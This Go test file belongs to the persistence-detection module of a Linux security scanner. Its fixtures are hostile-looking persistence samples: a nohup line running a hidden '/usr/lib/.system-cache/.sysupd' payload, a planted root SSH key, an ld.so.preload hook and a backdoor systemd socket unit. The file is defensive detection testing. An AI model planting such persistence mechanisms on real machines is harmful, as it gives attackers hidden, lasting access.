	cfg := config.NewDefaultConfig()
	rep := &memoryReporter{}
	mod := persistence.NewModuleWithRoot(root, nil, nil, nil)

	err := mod.Run(context.Background(), cfg, rep)
	if err != nil {
		t.Fatalf("unexpected error running persistence module: %v", err)
	}

	for _, f := range rep.findings {
		if f.RuleName == "Persistence_Exec_From_Hidden_Path" {
			t.Errorf("expected benign tool directories not to trigger Persistence_Exec_From_Hidden_Path, got: %+v", f)
		}
	}
}

func TestPersistence_CommandParser_Redirections(t *testing.T) {
	testCases := []struct {
		cmd             string
		expectedTargets []string
	}{
		{
			cmd:             "if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then",
			expectedTargets: []string{"tput"},
		},
		{
			cmd:             "cmd 2>&1",
			expectedTargets: []string{"cmd"},
		},
		{
			cmd:             "cmd &>/dev/null &",
			expectedTargets: []string{"cmd"},
		},
		{
			cmd:             "nohup /usr/bin/python3 /usr/lib/.system-cache/.sysupd &>/dev/null &",
			expectedTargets: []string{"/usr/bin/python3", "/usr/lib/.system-cache/.sysupd"},
		},
		{
			cmd:             "echo hi > /dev/null",
			expectedTargets: nil, // echo is built-in/ignored
		},
		{
			cmd:             "cmd |& grep error",
			expectedTargets: []string{"cmd", "grep"},
		},
		{
			cmd:             `cmd <<< "input"`,
			expectedTargets: []string{"cmd"},
		},
		{
			cmd:             "cmd << EOF\nsome data\nEOF",
			expectedTargets: []string{"cmd"},
		},
	}

	for _, tc := range testCases {
		targets, _ := persistence.ExtractExecTargets(tc.cmd)
		for _, exp := range tc.expectedTargets {
			found := false
			for _, act := range targets {
				if act == exp {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("command %q: expected target %q not found in %v", tc.cmd, exp, targets)
			}
		}
		// Ensure /dev/null is never returned as an exec target
		for _, act := range targets {
			if strings.HasPrefix(act, "/dev/") {
				if act == "/dev/null" || act == "/dev/zero" || act == "/dev/stdin" || act == "/dev/stdout" || act == "/dev/stderr" {
					t.Errorf("command %q: pseudo-file %q should not be an exec target", tc.cmd, act)
				}
			}
		}
	}
}

func TestPersistence_GuardedCommands(t *testing.T) {
	cfg := config.NewDefaultConfig()

	// 1. Single line guarded command
	sigs1 := persistence.CheckSuspiciousCommand("if [ -x /opt/missing_tool/bin ] && /opt/missing_tool/bin; then", 1, cfg, "", false, nil)
	for _, s := range sigs1 {
		if s.RuleName == "Persistence_Missing_Target_File" {
			t.Errorf("guarded single-line command should not emit Persistence_Missing_Target_File, got: %+v", s)
		}
	}

	// 2. Multiline guarded command with fileGuards
	fileContent := `if [ -x /usr/lib/command-not-found ]; then
    /usr/lib/command-not-found -- "$1"
fi`
	fileGuards := persistence.ExtractGuardedPaths(fileContent)
	if !fileGuards["/usr/lib/command-not-found"] {
		t.Fatalf("expected /usr/lib/command-not-found in fileGuards, got %v", fileGuards)
	}

	sigs2 := persistence.CheckSuspiciousCommand(`/usr/lib/command-not-found -- "$1"`, 2, cfg, "", false, nil, fileGuards)
	for _, s := range sigs2 {
		if s.RuleName == "Persistence_Missing_Target_File" {
			t.Errorf("guarded multiline command should not emit Persistence_Missing_Target_File, got: %+v", s)
		}
	}

	// 3. Hidden path guarded command should NOT be suppressed
	hiddenGuarded := `[ -x /usr/lib/.hidden_payload/run ] && /usr/lib/.hidden_payload/run`
	sigs3 := persistence.CheckSuspiciousCommand(hiddenGuarded, 3, cfg, "", false, nil)
	hasHiddenFinding := false
	for _, s := range sigs3 {
		if s.RuleName == "Persistence_Exec_From_Hidden_Path" {
			hasHiddenFinding = true
		}
	}
	if !hasHiddenFinding {
		t.Errorf("guarded hidden path command must still emit Persistence_Exec_From_Hidden_Path")
	}
}

func TestPersistence_WeakRulesVerdictEscalation(t *testing.T) {
	cfg := config.NewDefaultConfig()

	// 3 weak notice findings
	weakFindings := []report.Finding{
		report.NewFinding("persistence", report.SeverityNotice, "/etc/cron.d/test1", "missing target", "Persistence_Missing_Target_File"),
		report.NewFinding("persistence", report.SeverityNotice, "/etc/systemd/system/test2.service", "unowned unit", "Persistence_Systemd_Unowned_Unit"),
		report.NewFinding("persistence", report.SeverityNotice, "/etc/init.d/test3", "unowned script", "Persistence_InitD_Unowned_Script"),
	}

	verdict, _ := events.ComputeVerdict(weakFindings, 0, 0, len(weakFindings), cfg.Scan.VerdictNoticesThreshold, cfg.Scan.WeakRules)
	if verdict != events.VerdictClean {
		t.Errorf("3 weak notices should result in CLEAN verdict, got %s", verdict)
	}

	// 3 non-weak notice findings
	nonWeakFindings := []report.Finding{
		report.NewFinding("persistence", report.SeverityNotice, "/root/.bashrc", "home hidden path", "Persistence_Exec_From_Home_Hidden_Path"),
		report.NewFinding("persistence", report.SeverityNotice, "/root/.bashrc", "home hidden path", "Persistence_Exec_From_Home_Hidden_Path"),
		report.NewFinding("persistence", report.SeverityNotice, "/root/.bashrc", "home hidden path", "Persistence_Exec_From_Home_Hidden_Path"),
	}

	verdictNW, _ := events.ComputeVerdict(nonWeakFindings, 0, 0, len(nonWeakFindings), cfg.Scan.VerdictNoticesThreshold, cfg.Scan.WeakRules)
	if verdictNW != events.VerdictSuspicious {
		t.Errorf("3 non-weak notices should result in SUSPICIOUS verdict, got %s", verdictNW)
	}
}

func TestPersistence_LDPreload_UnderRoot(t *testing.T) {
	root := t.TempDir()
	_ = os.MkdirAll(filepath.Join(root, "etc"), 0755)
	_ = os.MkdirAll(filepath.Join(root, "lib"), 0755)

	// Create root preload library and /etc/ld.so.preload
	_ = os.WriteFile(filepath.Join(root, "lib/custom_hook.so"), []byte("ELF_FAKE_BYTES"), 0644)
	_ = os.WriteFile(filepath.Join(root, "etc/ld.so.preload"), []byte("/lib/custom_hook.so\n"), 0644)

	cfg := config.NewDefaultConfig()
	rep := &memoryReporter{}
	mod := persistence.NewModuleWithRoot(root, nil, nil, nil)

	err := mod.Run(context.Background(), cfg, rep)
	if err != nil {
		t.Fatalf("unexpected error running persistence module: %v", err)
	}

	foundPreloadFinding := false
	for _, f := range rep.findings {
		if strings.Contains(f.RuleName, "Persistence_Loader_Preload") {
			foundPreloadFinding = true
			if f.Severity != report.SeverityWarning && f.Severity != report.SeverityAlert {
				t.Errorf("expected at least WARNING severity for ld.so.preload finding, got %s", f.Severity)
			}
		}
	}

	if !foundPreloadFinding {
		t.Errorf("expected Persistence_Loader_Preload finding under root, got findings: %+v", rep.findings)
	}
}

func TestPersistence_DistroProfileScripts(t *testing.T) {
	cfg := config.NewDefaultConfig()

	// 1. bash_completion.sh sourcing ${XDG_CONFIG_HOME:-$HOME/.config}/bash_completion
	bashCompLine := `. "${XDG_CONFIG_HOME:-$HOME/.config}/bash_completion"`
	sigs1 := persistence.CheckSuspiciousCommand(bashCompLine, 1, cfg, "", true, nil)
	for _, s := range sigs1 {
		if s.RuleName == "Persistence_Exec_From_Hidden_Path" || s.RuleName == "Persistence_System_Exec_User_Hidden_Path" {
			t.Errorf("bash_completion.sh must not trigger hidden path rule, got: %+v", s)
		}
	}

	// 2. flatpak.sh referencing $HOME/.local/share/flatpak/exports/share
	flatpakLine := `export XDG_DATA_DIRS="$HOME/.local/share/flatpak/exports/share:${XDG_DATA_DIRS:-/usr/local/share:/usr/share}"`
	sigs2 := persistence.CheckSuspiciousCommand(flatpakLine, 2, cfg, "", true, nil)
	for _, s := range sigs2 {
		if s.RuleName == "Persistence_Exec_From_Hidden_Path" || s.RuleName == "Persistence_System_Exec_User_Hidden_Path" {
			t.Errorf("flatpak.sh must not trigger hidden path rule, got: %+v", s)
		}
	}

	// 3. User cache script $HOME/.cache/tracker
	cacheLine := `. "$HOME/.cache/tracker"`
	sigs3 := persistence.CheckSuspiciousCommand(cacheLine, 3, cfg, "", false, nil)
	for _, s := range sigs3 {
		if s.Severity >= report.SeverityWarning {
			t.Errorf("user cache script should not trigger WARNING or higher, got: %+v", s)
		}
	}

	// 4. Actual malicious hidden path under /usr/lib/.system-cache/.sysupd
	malwareLine := `nohup python3 /usr/lib/.system-cache/.sysupd &>/dev/null &`
	sigs4 := persistence.CheckSuspiciousCommand(malwareLine, 4, cfg, "", true, nil)
	foundHiddenWarning := false
	for _, s := range sigs4 {
		if s.RuleName == "Persistence_Exec_From_Hidden_Path" && s.Severity == report.SeverityWarning {
			foundHiddenWarning = true
		}
	}
	if !foundHiddenWarning {
		t.Errorf("expected Persistence_Exec_From_Hidden_Path warning for /usr/lib/.system-cache/.sysupd, got: %+v", sigs4)
	}
}

func TestPersistence_SSHNonStandardKeyLocation(t *testing.T) {
	root := t.TempDir()
	_ = os.MkdirAll(filepath.Join(root, "root/.ssh"), 0700)
	_ = os.MkdirAll(filepath.Join(root, "etc"), 0755)

	// Setup /etc/passwd
	_ = os.WriteFile(filepath.Join(root, "etc/passwd"), []byte("root:x:0:0:root:/root:/bin/bash\n"), 0644)

	// Setup authorized_keys with comment referencing /usr/lib/.system-cache/id_ed25519
	keyLine := "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGhostKeyPlantedTestCaseForAetherHunt root@/usr/lib/.system-cache/id_ed25519\n"
	_ = os.WriteFile(filepath.Join(root, "root/.ssh/authorized_keys"), []byte(keyLine), 0600)

	cfg := config.NewDefaultConfig()
	rep := &memoryReporter{}
	mod := persistence.NewModuleWithRoot(root, nil, nil, nil)

	err := mod.Run(context.Background(), cfg, rep)
	if err != nil {
		t.Fatalf("unexpected error running persistence module: %v", err)
	}

	foundNonStandardFinding := false
	for _, f := range rep.findings {
		if strings.Contains(f.RuleName, "Persistence_SSH_Key_Non_Standard_Location") {
			foundNonStandardFinding = true
			if f.Severity != report.SeverityWarning {
				t.Errorf("expected WARNING for non-standard key location, got %s", f.Severity)
			}
		}
	}

	if !foundNonStandardFinding {
		t.Errorf("expected Persistence_SSH_Key_Non_Standard_Location finding, got: %+v", rep.findings)
	}
}

func TestPersistence_SystemdSocketActivation(t *testing.T) {
	root := t.TempDir()
	sysdDir := filepath.Join(root, "etc/systemd/system")
	_ = os.MkdirAll(sysdDir, 0755)

	socketContent := `[Unit]
Description=Stealth Backdoor Listener Socket
[Socket]
ListenFIFO=/tmp/.backdoor_fifo
Service=backdoor.service
[Install]
WantedBy=sockets.target
`
	_ = os.WriteFile(filepath.Join(sysdDir, "backdoor.socket"), []byte(socketContent), 0644)

	cfg := config.NewDefaultConfig()
	rep := &memoryReporter{}
	mod := persistence.NewModuleWithRoot(root, nil, nil, nil)

	err := mod.Run(context.Background(), cfg, rep)
	if err != nil {
		t.Fatalf("unexpected error running persistence module: %v", err)
	}

	foundSocket := false
	for _, f := range rep.findings {
		if strings.Contains(f.RuleName, "Persistence_Systemd_Socket_Activation") {
			foundSocket = true
			if f.Severity != report.SeverityWarning {
				t.Errorf("expected WARNING for suspicious socket FIFO activation, got %s", f.Severity)
			}
		}
	}

	if !foundSocket {
		t.Errorf("expected Persistence_Systemd_Socket_Activation finding, got: %+v", rep.findings)
	}
}
